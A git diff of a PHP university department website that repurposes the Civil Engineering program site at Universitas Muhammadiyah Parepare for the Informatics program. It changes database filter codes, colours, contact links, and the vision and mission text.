@@ -54,7 +54,7 @@ function beranda(){
     $fieldsbanner = ['IdBanner', 'FileBanner'];
     $orderbybanner = 'IdBanner DESC';
     $limitbanner = 5;
-    $kondisibanner = ["Kode = '19'"];
+    $kondisibanner = ["Kode = '28'"];
     $databanner = $data->getDataFromTable($tbbanner, $fieldsbanner, $orderbybanner, $limitbanner, $kondisibanner);
 
     $tbinformasi = 'tb_informasi';
@@ -62,21 +62,21 @@ function beranda(){
     $orderbyinformasi = 'KategoriInformasi DESC, IdInformasi DESC';
     $distinctinformasi1 = "KategoriInformasi";
     $limitinformasi = null;
-    $kondisiinformasi1 = ["Kode = '19'","KategoriInformasi <> 'Agenda'"];
+    $kondisiinformasi1 = ["Kode = '28'","KategoriInformasi <> 'Agenda'"];
     $datainformasi1 = $data->getDataFromTable($tbinformasi, $fieldsinformasi1, $orderbyinformasi, $limitinformasi, $kondisiinformasi1, $distinctinformasi1);
 
     $tbberita = 'tb_berita';
     $fieldsberita = ['NamaBerita', 'KeteranganBerita', 'PenulisBerita', 'TanggalBerita', 'MenuBerita', 'FotoBerita', 'URL'];
     $orderbyberita = 'TanggalBerita DESC, IdBerita DESC';
     $limitberita = 2;
-    $kondisiberita = ["Kode = '19'"];
+    $kondisiberita = ["Kode = '28'"];
     $databerita = $data->getDataFromTable($tbberita, $fieldsberita, $orderbyberita, $limitberita, $kondisiberita);
 
     $tblink = 'tb_link_youtube';
     $fieldslink = ['IdLink', 'Link'];
     $orderbylink = 'IdLink DESC';
     $limitlink = 1;
-    $kondisilink = ["Kode = '19'"];
+    $kondisilink = ["Kode = '28'"];
     $datalinkyoutube = $data->getDataFromTable($tblink, $fieldslink, $orderbylink, $limitlink, $kondisilink);
 
 
@@ -162,7 +162,7 @@ function beranda(){
                                         $fieldsinformasi2 = ['KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'URL'];
                                         $distinctinformasi2 = null;
                                         $limitinformasi2 = 3;
-                                        $kondisiinformasi2 = ["KategoriInformasi = '$kateg'", "Kode = '19'"];
+                                        $kondisiinformasi2 = ["KategoriInformasi = '$kateg'", "Kode = '28'"];
                                         $datainformasi2 = $data->getDataFromTable($tbinformasi, $fieldsinformasi2, $orderbyinformasi, $limitinformasi2, $kondisiinformasi2, $distinctinformasi2);
                                         foreach ($datainformasi2 as $row2):
                                             $kateginfo = htmlspecialchars($row2["KategoriInformasi"]);
@@ -206,7 +206,7 @@ function beranda(){
                         $fieldsagenda = ['KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'URL'];
                         $distinctagenda = null;
                         $limitagenda = 5;
-                        $kondisiagenda = ["Kode = '19'","KategoriInformasi = 'Agenda'"];
+                        $kondisiagenda = ["Kode = '28'","KategoriInformasi = 'Agenda'"];
                         $dataagenda = $data->getDataFromTable($tbinformasi, $fieldsagenda, $orderbyinformasi, $limitagenda, $kondisiagenda, $distinctagenda);
                         $rowCount = count($dataagenda);
                         if($rowCount == true){
@@ -310,7 +310,7 @@ function beranda(){
             echo'
             </div>
             <div class="text-center">
-                <a href="' . BASE_URL . 'berita_program_studi" type="button" class="btn btn-warning">Berita Lainnya...</a>
+                <a href="' . BASE_URL . 'berita_program_studi" type="button" class="btn btn-success">Berita Lainnya...</a>
             </div>
         </div>
     </section>
@@ -327,8 +327,8 @@ function beranda(){
                     </div>
                 </div>
                 <div class="col-md-6">
-                    <h4 class="text-uppercase mb-4">Program Studi Teknik Sipil</h4>
-                    <p class="text-justify">Program Studi Teknik Sipil, Fakultas Teknik, Universitas Muhammadiyah Parepare (PSTS FT-UMPAR) merupakan salah satu program studi yang sudah ada sejak awal berdirinya Universitas Muhammadiyah Parepare (UMPAR) pada tanggal 10 Mei 1999 M bertepatan dengan tanggal 24 Muharram 1420 H berdasarkan Surat Keputusan Menteri Pendidikan dan Kebudayaan Republik Indonesia (MENDIKBUD-RI) Nomor 86/D/O/1999 tanggal 10 Mei 1999 di bawah pengelolaan Fakultas Teknik...
+                    <h4 class="text-uppercase mb-4">Program Studi Teknik Informatika</h4>
+                    <p class="text-justify">Program Studi Teknik Informatika, Fakultas Teknik, Universitas Muhammadiyah Parepare (PSTI FT-UMPAR) merupakan salah satu program studi yang sudah ada sejak awal berdirinya Universitas Muhammadiyah Parepare (UMPAR) pada tanggal 10 Mei 1999 M bertepatan dengan tanggal 24 Muharram 1420 H berdasarkan Surat Keputusan Menteri Pendidikan dan Kebudayaan Republik Indonesia (MENDIKBUD-RI) Nomor 86/D/O/1999 tanggal 10 Mei 1999 di bawah pengelolaan Fakultas Teknik...
                     </p>
                     <a href="" type="button" class="btn btn-light btn-sm float-right">Selengkapnya <i class="fa fa-angle-double-right"></i></a>
                 </div>
@@ -344,7 +344,7 @@ function beranda(){
                 </div>
                 <div class="col-md-12 text-center">
                     <div class="wrapper img-fluid">
-                        <a href="https://www.facebook.com/tekniksipilumpar1/" target="_blank" style="color: black;">
+                        <a href="https://m.facebook.com/people/Teknik-Informatika-UMPAR/100064313221746/" target="_blank" style="color: black;">
                             <div class="icon facebook">
                                 <div class="tooltip">
                                 Facebook
@@ -352,7 +352,7 @@ function beranda(){
                                 <span><i class="fa fa-facebook"></i></span>
                             </div>
                         </a>
-                        <a href="https://www.instagram.com/tekniksipilumpar/" target="_blank" style="color: black;">
+                        <a href="https://www.instagram.com/teknikumpar.official/" target="_blank" style="color: black;">
                             <div class="icon instagram">
                                 <div class="tooltip">
                                 Instagram
@@ -360,7 +360,7 @@ function beranda(){
                                 <span><i class="fa fa-instagram"></i></span>
                             </div>
                         </a>
-                        <a href="https://api.whatsapp.com/send?phone=6285255853465&text=السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ" target="_blank" style="color: black;">
+                        <a href="https://api.whatsapp.com/send?phone=6282384091594&text=السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ" target="_blank" style="color: black;">
                             <div class="icon whatsapp">
                                 <div class="tooltip">
                                 WhatsApp
@@ -368,7 +368,7 @@ function beranda(){
                                 <span><i class="fa fa-whatsapp"></i></span>
                             </div>
                         </a>
-                        <a href="https://www.youtube.com/@tekniksipilumpar" target="_blank" style="color: black;">
+                        <a href="https://www.youtube.com/@informatika_umpar" target="_blank" style="color: black;">
                             <div class="icon youtube">
                                 <div class="tooltip">
                                 Youtube
@@ -391,7 +391,7 @@ function agenda(){
 
     $tbpageinfo = 'tb_informasi';
     $fieldspage = ['IdInformasi', 'KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'GambarInformasi', 'URL'];
-    $kondisipage = ["Kode = '19'", "KategoriInformasi = 'Agenda'"];
+    $kondisipage = ["Kode = '28'", "KategoriInformasi = 'Agenda'"];
     $orderBypage = 'TanggalInformasi DESC, IdInformasi DESC';
     $pagepage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
     $limitpage = 6;
@@ -400,7 +400,7 @@ function agenda(){
     $fieldsinfo = null;
     $distinctinfo = "KategoriInformasi";
     $limitinfo = null;
-    $kondisiinfo = ["Kode = '19'", "KategoriInformasi <> 'Agenda'"];
+    $kondisiinfo = ["Kode = '28'", "KategoriInformasi <> 'Agenda'"];
     $datainfo = $data->getDataFromTable($tbpageinfo, $fieldsinfo, $orderBypage, $limitinfo, $kondisiinfo, $distinctinfo);
 
     echo'
@@ -434,7 +434,7 @@ function agenda(){
                 echo'
                     </ul>';
                     $kodearr = [
-                        "Kode = '19'",
+                        "Kode = '28'",
                         "KategoriInformasi = 'Agenda'"
                     ];
                     $selectQuery = "SELECT COUNT(*) AS IdInformasi FROM tb_informasi WHERE " . implode(' AND ', $kodearr);
@@ -455,7 +455,7 @@ function agenda(){
                         <ul class="list-group text-left">';
                         $distinctinfonya = null;
                         $limitinfonya = 5;
-                        $kondisiinfonya = ["Kode = '19'","KategoriInformasi = '$kateg'"];
+                        $kondisiinfonya = ["Kode = '28'","KategoriInformasi = '$kateg'"];
                         $datainfonya = $data->getDataFromTable($tbpageinfo, $fieldspage, $orderBypage, $limitinfonya, $kondisiinfonya, $distinctinfonya);
                         if (!empty($datainfonya)){
                         foreach ($datainfonya as $row2):
@@ -500,7 +500,7 @@ function pengumuman(){
 
     $tbpageinfo = 'tb_informasi';
     $fieldspage = ['IdInformasi', 'KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'GambarInformasi', 'URL'];
-    $kondisipage = ["Kode = '19'", "KategoriInformasi = 'Pengumuman'"];
+    $kondisipage = ["Kode = '28'", "KategoriInformasi = 'Pengumuman'"];
     $orderBypage = 'TanggalInformasi DESC, IdInformasi DESC';
     $pagepage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
     $limitpage = 6;
@@ -509,7 +509,7 @@ function pengumuman(){
     $fieldsinfo = null;
     $distinctinfo = "KategoriInformasi";
     $limitinfo = null;
-    $kondisiinfo = ["Kode = '19'", "KategoriInformasi <> 'Pengumuman'"];
+    $kondisiinfo = ["Kode = '28'", "KategoriInformasi <> 'Pengumuman'"];
     $datainfo = $data->getDataFromTable($tbpageinfo, $fieldsinfo, $orderBypage, $limitinfo, $kondisiinfo, $distinctinfo);
 
     echo'
@@ -543,7 +543,7 @@ function pengumuman(){
                 echo'
                     </ul>';
                     $kodearr = [
-                        "Kode = '19'",
+                        "Kode = '28'",
                         "KategoriInformasi = 'Pengumuman'"
                     ];
                     $selectQuery = "SELECT COUNT(*) AS IdInformasi FROM tb_informasi WHERE " . implode(' AND ', $kodearr);
@@ -564,7 +564,7 @@ function pengumuman(){
                         <ul class="list-group text-left">';
                         $distinctinfonya = null;
                         $limitinfonya = 5;
-                        $kondisiinfonya = ["Kode = '19'","KategoriInformasi = '$kateg'"];
+                        $kondisiinfonya = ["Kode = '28'","KategoriInformasi = '$kateg'"];
                         $datainfonya = $data->getDataFromTable($tbpageinfo, $fieldspage, $orderBypage, $limitinfonya, $kondisiinfonya, $distinctinfonya);
                         if (!empty($datainfonya)){
                         foreach ($datainfonya as $row2):
@@ -609,7 +609,7 @@ function lowongan(){
 
     $tbpageinfo = 'tb_informasi';
     $fieldspage = ['IdInformasi', 'KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'GambarInformasi', 'URL'];
-    $kondisipage = ["Kode = '19'", "KategoriInformasi = 'Lowongan'"];
+    $kondisipage = ["Kode = '28'", "KategoriInformasi = 'Lowongan'"];
     $orderBypage = 'TanggalInformasi DESC, IdInformasi DESC';
     $pagepage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
     $limitpage = 6;
@@ -618,7 +618,7 @@ function lowongan(){
     $fieldsinfo = null;
     $distinctinfo = "KategoriInformasi";
     $limitinfo = null;
-    $kondisiinfo = ["Kode = '19'", "KategoriInformasi <> 'Lowongan'"];
+    $kondisiinfo = ["Kode = '28'", "KategoriInformasi <> 'Lowongan'"];
     $datainfo = $data->getDataFromTable($tbpageinfo, $fieldsinfo, $orderBypage, $limitinfo, $kondisiinfo, $distinctinfo);
 
     echo'
@@ -652,7 +652,7 @@ function lowongan(){
                 echo'
                     </ul>';
                     $kodearr = [
-                        "Kode = '19'",
+                        "Kode = '28'",
                         "KategoriInformasi = 'Lowongan'"
                     ];
                     $selectQuery = "SELECT COUNT(*) AS IdInformasi FROM tb_informasi WHERE " . implode(' AND ', $kodearr);
@@ -673,7 +673,7 @@ function lowongan(){
                         <ul class="list-group text-left">';
                         $distinctinfonya = null;
                         $limitinfonya = 5;
-                        $kondisiinfonya = ["Kode = '19'","KategoriInformasi = '$kateg'"];
+                        $kondisiinfonya = ["Kode = '28'","KategoriInformasi = '$kateg'"];
                         $datainfonya = $data->getDataFromTable($tbpageinfo, $fieldspage, $orderBypage, $limitinfonya, $kondisiinfonya, $distinctinfonya);
                         if (!empty($datainfonya)){
                         foreach ($datainfonya as $row2):
@@ -718,7 +718,7 @@ function beasiswa(){
 
     $tbpageinfo = 'tb_informasi';
     $fieldspage = ['IdInformasi', 'KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'GambarInformasi', 'URL'];
-    $kondisipage = ["Kode = '19'", "KategoriInformasi = 'Beasiswa'"];
+    $kondisipage = ["Kode = '28'", "KategoriInformasi = 'Beasiswa'"];
     $orderBypage = 'TanggalInformasi DESC, IdInformasi DESC';
     $pagepage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
     $limitpage = 6;
@@ -727,7 +727,7 @@ function beasiswa(){
     $fieldsinfo = null;
     $distinctinfo = "KategoriInformasi";
     $limitinfo = null;
-    $kondisiinfo = ["Kode = '19'", "KategoriInformasi <> 'Beasiswa'"];
+    $kondisiinfo = ["Kode = '28'", "KategoriInformasi <> 'Beasiswa'"];
     $datainfo = $data->getDataFromTable($tbpageinfo, $fieldsinfo, $orderBypage, $limitinfo, $kondisiinfo, $distinctinfo);
 
     echo'
@@ -761,7 +761,7 @@ function beasiswa(){
                 echo'
                     </ul>';
                     $kodearr = [
-                        "Kode = '19'",
+                        "Kode = '28'",
                         "KategoriInformasi = 'Beasiswa'"
                     ];
                     $selectQuery = "SELECT COUNT(*) AS IdInformasi FROM tb_informasi WHERE " . implode(' AND ', $kodearr);
@@ -782,7 +782,7 @@ function beasiswa(){
                         <ul class="list-group text-left">';
                         $distinctinfonya = null;
                         $limitinfonya = 5;
-                        $kondisiinfonya = ["Kode = '19'","KategoriInformasi = '$kateg'"];
+                        $kondisiinfonya = ["Kode = '28'","KategoriInformasi = '$kateg'"];
                         $datainfonya = $data->getDataFromTable($tbpageinfo, $fieldspage, $orderBypage, $limitinfonya, $kondisiinfonya, $distinctinfonya);
                         if (!empty($datainfonya)){
                         foreach ($datainfonya as $row2):
@@ -827,7 +827,7 @@ function berita_program_studi(){
 
     $tbberitapage = 'tb_berita';
     $fieldsberitapage = ['NamaBerita', 'KeteranganBerita', 'PenulisBerita', 'TanggalBerita', 'MenuBerita', 'FotoBerita', 'URL'];
-    $kondisiberitapage = ["Kode = '19'"];
+    $kondisiberitapage = ["Kode = '28'"];
     $orderByberitapage = 'TanggalBerita DESC, IdBerita DESC';
     $pageberitapage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
     $limitberitapage = 6;
@@ -892,7 +892,7 @@ function berita_program_studi(){
                 echo'
             </div>';
             $kodearr = [
-                "Kode = '19'",
+                "Kode = '28'",
             ];
             $selectQuery = "SELECT COUNT(*) AS IdBerita FROM tb_berita WHERE " . implode(' AND ', $kodearr);
             $baseURL = BASE_URL . 'berita_program_studi/';
@@ -912,7 +912,7 @@ function visi_misi_tujuan(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Profil</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Visi, Misi dan Tujuan</li>
                     </ol>
@@ -929,23 +929,23 @@ function visi_misi_tujuan(){
                 </div>
                 <div class="col-md-12">
                     <h3 class="text-uppercase text-center">Visi</h3>
-                    <p class="text-center">“Terwujudnya pengembangan inovasi rekayasa ketekniksipilan yang unggul untuk Menghasilkan Sumber Daya Manusia yang Sejahtera berbasis Kewirausahaan Digital pada Tahun 2044”</p>
+                    <p class="text-center">“Menjadi program studi yang unggul dalam bidang teknik Informatika khususnya pada rekayasa perangkat cerdas dan sistem otomasi yang berlandaskan nilai-nilai islam berkemajuan pada tahun 2033”</p>
 
                     <h3 class="text-uppercase text-center">Misi</h3>
                     <ol class="text-justify">
-                    <li>Menyelenggarakan pendidikan teknik sipil yang menghasilkan sarjana unggul dan bedaya saing dengan mengintegrasikan nilai religius dan budaya bugis.</li>
-                    <li>Mempunyai wawasan keilmuan yang ilmiah, profesional, dan kompetitif di bidang rekayasa ketekniksipilan.</li>
-                    <li>Melaksanakan kegiatan penelitian berdasarkan roadmap yang terintegrasi pada pengembangan kompetensi spesifikasi keilmuan.</li>
-                    <li>Meningkatkan kualitas, integritas moral yang tinggi serta mampu bekerjasama, berinovasi, kreatif dan profesional dalam bidang teknik sipil yang bercirikan kekhasan daerah.</li>
-                    <li>Meningkatkan hubungan kerjasama strategis dengan mitra pada program pengembangan infrastruktur wilayah guna menciptakan Sumber Daya Manusia yang Sejahtera berbasis Kewirausahaan Digital.</li>
+                    <li>Melaksanakan nilai-nilai al-islam kemuhammadiyahan dalam kegiatan kampus sehingga tercipta suasana akademik yang islami.</li>
+                    <li>Menyelenggarakan dan mengembangkan kegiatan akademik yang berkualitas berbasis Teknologi Informasi dan Komunikasi untuk menghasilkan lulusan yang unggul dan berkompeten pada bidang teknik Informatika khususnya rekayasa perangkat cedas dan sistem otomasi.</li>
+                    <li>Menyelenggarakan kegiatan penelitian, pengabdian kepada masyarakat dalam bidang teknik Informatika khususnya rekayasa perangkat cerdas dan sistem otomasi yang unggul dan dapat berkontribusi pada masyarakat.</li>
+                    <li>Menyelenggarakan kerjasama dengan berbagai perguruan tinggi, instansi pemerintahan dan swasta, dunia usaha dan industri dalam rangka peningkatan kualitas yang berkelanjutan.</li>
                     </ol>
 
                     <h3 class="text-uppercase text-center">Tujuan</h3>
                     <ol class="text-justify">
-                    <li>Menghasilkan lulusan yang religius/ islami dan berkualitas di bidang teknik sipil.</li>
-                    <li>Menghasilkan lulusan yang mampu mengaplikasikan ilmu pengetahuan di bidang perencanaan, pengawasan dan pembangunan infrastruktur.</li>
-                    <li>Menghasilkan lulusan yang berorientasi pada kebutuhan masyarakat dan pengembangan daerah secara profesional, inovatif, kreatif serta mampu bekerjasama.</li>
-                    <li>Menghasilkan lulusan yg memiliki kompetensi sesuai dengan kebutuhan dunia kerja.</li>
+                    <li>Menghasilkan lulusan religius berkarakter kearifan lokal yang sesuai dengan nilai-nilai al-islam kemuhammadiyahan.</li>
+                    <li>Menghasilkan lulusan yang profesional dalam bidang teknik Informatika khususnya rekayasa perangkat cerdas dan sistem otomasi, serta inovatif, kreatif sehingga mampu berwirausaha mandiri dan kompetitif di dunia kerja. </li>
+                    <li>Mengembangkan kualitas sumber daya manusia (dosen dan tendik).</li>
+                    <li>Mengembangkan dan menyebarluaskan ilmu pengetahuan dan teknologi dalam bidang teknik Informatika khususnya rekayasa perangkat cerdas dan sistem otomasi melalui kegiatan akademik, penelitian dan pengabdian kepada masyarakat yang relevan dengan kebutuhan masyarakat dan dunia kerja.</li>
+                    <li>Meningkatkan kualitas tridarma perguruan tinggi melalui pengembangan jejaring kemitraan dan pemberdayaan lulusan yang tersebar di dunia usaha dan dunia kerja.</li>
                     </ol>
                 </div>
             </div>
@@ -960,7 +960,7 @@ function struktur_organisasi(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Profil</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Struktur Organisasi</li>
                     </ol>
@@ -968,7 +968,7 @@ function struktur_organisasi(){
             </div>
             <div class="row">
                 <div class="text-center mx-3">
-                    <img src="'.BASE_URL.'img/struk_ts.jpg" class="img-fluid img-thumbnail" alt="Bagan Struktur">
+                    <img src="'.BASE_URL.'img/struk_ti.jpg" class="img-fluid img-thumbnail" alt="Bagan Struktur">
                 </div>
             </div>
         </div>
@@ -983,7 +983,7 @@ function dosen_program_studi(){
     $fieldsdosen = ['NamaDosen', 'Strata1', 'Strata2', 'Strata3', 'Email', 'NIDN', 'IdSinta', 'IdScopus', 'JaFung', 'FotoDosen'];
     $orderbydosen = 'IdDosen ASC';
     $limitdosen = null;
-    $kondisidosen = ["Kode = '19'"];
+    $kondisidosen = ["Kode = '28'"];
     $datadosen = $data->getDataFromTable($tbdosen, $fieldsdosen, $orderbydosen, $limitdosen, $kondisidosen);
 
     echo'
@@ -991,7 +991,7 @@ function dosen_program_studi(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Profil</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Dosen Program Studi</li>
                     </ol>
@@ -1027,7 +1027,7 @@ function dosen_program_studi(){
                             <img src="' . BASE_URL . 'img/dosen/' . $fildos . '" alt="' . $nmdos . '" class="rounded-circle img-fluid">
                         </div>
                         <div class="card-body">
-                            <h4 class="card-title mt-1 mb-1"><span class="badge badge-danger" style="border-radius: 6px;">' . $nmdos . '</span></h4>
+                            <h4 class="card-title mt-1 mb-1"><span class="badge badge-success" style="border-radius: 6px;">' . $nmdos . '</span></h4>
                             <p class="font-weight-bold">NIDN. ' . $nidn . '</p>
                             <button type="button" class="btn btn-light btn-sm" onclick="detaildatadosen(\''.$fildos.'\',\''.str_replace(['"', '\''], ['^', '*'], $nmdos).'\')" data-toggle="modal" data-target="#detaildatadosen"><i class="fa fa-eye"></i> Selengkapnya</button>
                         </div>
@@ -1047,7 +1047,7 @@ function fasilitas(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Profil</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Fasilitas</li>
                     </ol>
@@ -1069,7 +1069,7 @@ function kalender_akademik(){
     $fieldskalenderakademik = ['Kategori', 'TahunAkademik', 'UnggahFile'];
     $orderbykalenderakademik = 'IdKalenderAkademik ASC, TahunAkademik ASC';
     $limitkalenderakademik = null;
-    $kondisikalenderakademik = ["Kode = '19'"];
+    $kondisikalenderakademik = ["Kode = '28'"];
     $datakalenderakademik = $data->getDataFromTable($tbkalenderakademik, $fieldskalenderakademik, $orderbykalenderakademik, $limitkalenderakademik, $kondisikalenderakademik);
 
     echo'
@@ -1077,7 +1077,7 @@ function kalender_akademik(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Kalender Akademik</li>
                     </ol>
@@ -1108,7 +1108,7 @@ function kalender_akademik(){
 //         <div class="container py-4">
 //             <div class="bc-icons-2">    
 //                 <nav aria-label="breadcrumb">
-//                     <ol class="breadcrumb orange lighten-4">
+//                     <ol class="breadcrumb green lighten-4">
 //                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
 //                         <li class="breadcrumb-item active">Panduan Akademik</li>
 //                     </ol>
@@ -1131,7 +1131,7 @@ function struktur_kurikulum(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Struktur Kurikulum</li>
                     </ol>
@@ -1187,7 +1187,7 @@ function struktur_kurikulum(){
                                             $orderbystrukkuri = 'Semester ASC, IdStrukturKurikulum ASC';
                                             $limitstrukkuri = null;
                                             $kondisistrukkuri = [
-                                                "Kode = '19'",
+                                                "Kode = '28'",
                                                 $wheresmt,
                                             ];
                                             $datastrukkuri = $data->getDataFromTable($tbstrukkuri, $fieldsstrukkuri, $orderbystrukkuri, $limitstrukkuri, $kondisistrukkuri);
@@ -1247,7 +1247,7 @@ function capstone_design(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Capstone Design</li>
                     </ol>
@@ -1268,7 +1268,7 @@ function capstone_design(){
 //         <div class="container py-4">
 //             <div class="bc-icons-2">    
 //                 <nav aria-label="breadcrumb">
-//                     <ol class="breadcrumb orange lighten-4">
+//                     <ol class="breadcrumb green lighten-4">
 //                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
 //                         <li class="breadcrumb-item active">Capaian Pembelajaran Lulusan</li>
 //                     </ol>
@@ -1290,7 +1290,7 @@ function download(){
     $fieldsdownload = ['NamaDownload', 'FileDownload'];
     $orderbydownload = 'Iddownload ASC';
     $limitdownload = null;
-    $kondisidownload = ["Kode = '19'"];
+    $kondisidownload = ["Kode = '28'"];
     $datadownload = $data->getDataFromTable($tbdownload, $fieldsdownload, $orderbydownload, $limitdownload, $kondisidownload);
 
     $file_ext = array('rar', 'zip', 'pdf', 'docx', 'doc');
@@ -1307,7 +1307,7 @@ function download(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Download</li>
                     </ol>
@@ -1339,7 +1339,6 @@ function download(){
     </section>';
 }
 
-
 function prestasi_mahasiswa(){
 
     $data = new Data();
@@ -1349,7 +1348,7 @@ function prestasi_mahasiswa(){
     $orderbypremhs = 'KategoriPrestasi ASC, IdPrestasiMahasiswa ASC';
     $distinctpremhs1 = "KategoriPrestasi";
     $limitpremhs = null;
-    $kondisipremhs1 = ["Kode = '19'"];
+    $kondisipremhs1 = ["Kode = '28'"];
     $datapremhs1 = $data->getDataFromTable($tbpremhs, $fieldspremhs1, $orderbypremhs, $limitpremhs, $kondisipremhs1, $distinctpremhs1);
 
     echo'
@@ -1357,7 +1356,7 @@ function prestasi_mahasiswa(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Mahasiswa & Alumni</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Prestasi Mahasiswa</li>
                     </ol>
@@ -1399,7 +1398,7 @@ function prestasi_mahasiswa(){
                                             <tbody>';
                                             $fieldspremhs2 = ['KategoriPrestasi', 'Kegiatan', 'Peserta', 'Tahun', 'Tingkat', 'Prestasi'];
                                             $distinctpremhs2 = null;
-                                            $kondisipremhs2 = ["KategoriPrestasi = '$kateg'", "Kode = '19'"];
+                                            $kondisipremhs2 = ["KategoriPrestasi = '$kateg'", "Kode = '28'"];
                                             $datapremhs2 = $data->getDataFromTable($tbpremhs, $fieldspremhs2, $orderbypremhs, $limitpremhs, $kondisipremhs2, $distinctpremhs2);
                                             $no=1;
                                             foreach ($datapremhs2 as $row2):
@@ -1448,7 +1447,7 @@ function himpunan_mahasiswa(){
     $orderbyhimp = null;
     $distincthimp = null;
     $limithimp = null;
-    $kondisihimp = ["Kode = '19'", "Logo='hms.jpg'"];
+    $kondisihimp = ["Kode = '28'", "Logo='hmti.jpg'"];
     $datahimp = $data->getDataFromTable($tbhimp, $fieldshimp, $orderbyhimp, $limithimp, $kondisihimp, $distincthimp);
 
     $tbpengurushimp = 'tb_himpunan_pengurus';
@@ -1456,14 +1455,14 @@ function himpunan_mahasiswa(){
     $orderbypengurushimp = 'IdPengurusHimpunan DESC';
     $distinctpengurushimp = null;
     $limitpengurushimp = null;
-    $kondisipengurushimp = ["Kode = '19'"];
+    $kondisipengurushimp = ["Kode = '28'"];
     $datapengurushimp = $data->getDataFromTable($tbpengurushimp, $fieldspengurushimp, $orderbypengurushimp, $limitpengurushimp, $kondisipengurushimp, $distinctpengurushimp);
 
     $tbkeghimp = 'tb_himpunan_kegiatan';
     $fieldskeghimp = ['Judul', 'Keterangan', 'FotoFile'];
     $orderbykeghimp = 'IdKegiatanHimpunan DESC';
     $limitkeghimp = 10;
-    $kondisikeghimp = ["Kode = '19'"];
+    $kondisikeghimp = ["Kode = '28'"];
     $datakeghimp = $data->getDataFromTable($tbkeghimp, $fieldskeghimp, $orderbykeghimp, $limitkeghimp, $kondisikeghimp);
 
     echo'
@@ -1471,7 +1470,7 @@ function himpunan_mahasiswa(){
         <div class="container py-4">
             <div class="bc-icons-2">    
                 <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb orange lighten-4">
+                    <ol class="breadcrumb green lighten-4">
                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Mahasiswa & Alumni</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                         <li class="breadcrumb-item active">Himpunan Mahasiswa</li>
                     </ol>
@@ -1508,7 +1507,7 @@ function himpunan_mahasiswa(){
                 echo'
                 </div>
                 <div class="col-md-6">
-                    <p class="judulred">Kepengurusan HMS</p>
+                    <p class="judulred">Kepengurusan HMTI</p>
                     <div class="accordion md-accordion" id="accordionEx" role="tablist" aria-multiselectable="true">';
                     $nomrnya=1;
                     $tampil = ' show';
@@ -1572,7 +1571,7 @@ function himpunan_mahasiswa(){
